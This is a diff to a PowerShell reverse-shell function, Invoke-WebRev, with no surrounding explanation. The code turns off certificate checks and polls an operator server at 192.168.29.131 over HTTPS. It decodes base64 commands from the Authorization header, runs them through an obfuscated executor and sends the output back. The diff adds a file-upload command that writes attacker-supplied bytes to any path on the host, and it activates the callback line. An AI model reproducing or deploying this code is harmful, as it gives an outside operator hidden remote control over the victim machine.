@@ -39,20 +39,31 @@ function Invoke-WebRev{
         try
         {
             [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-            $req = Invoke-WebRequest $url -Method POST -Body $postParams -UseBasicParsing -UseDefaultCredentials -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
+            $req = Invoke-WebRequest $url -UseBasicParsing -Method POST -Body $postParams -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
             $header = $req.Headers["Authorization"];
             $c = [System.Convert]::FromBase64String($header);
             $cstr = [System.Text.Encoding]::UTF8.GetString($c);
             $result = "";
 
+            if($cstr.split(" ")[0] -eq "upload")
+            {
+                $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
+                $location = $cstr.split(" ")[2];
+                $content = [System.Convert]::FromBase64String($uploadData);
+                $content | Set-Content $location -Encoding Byte
+                $result = "[+] File uploaded successfully.";
+                $cstr = "pwd";
+            }
+             
             Foreach ($string in taleska-ei-vrixeka $cstr)
             {
                 $result += '_n1w_' + $string;
             };
+
             $result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result));
             $postParams = @{result=$result};
         }catch {};
     };
 }
 
-#Invoke-WebRev -ip 192.168.29.131 -port 80
+Invoke-WebRev -ip 192.168.29.131 -port 443 -ssl
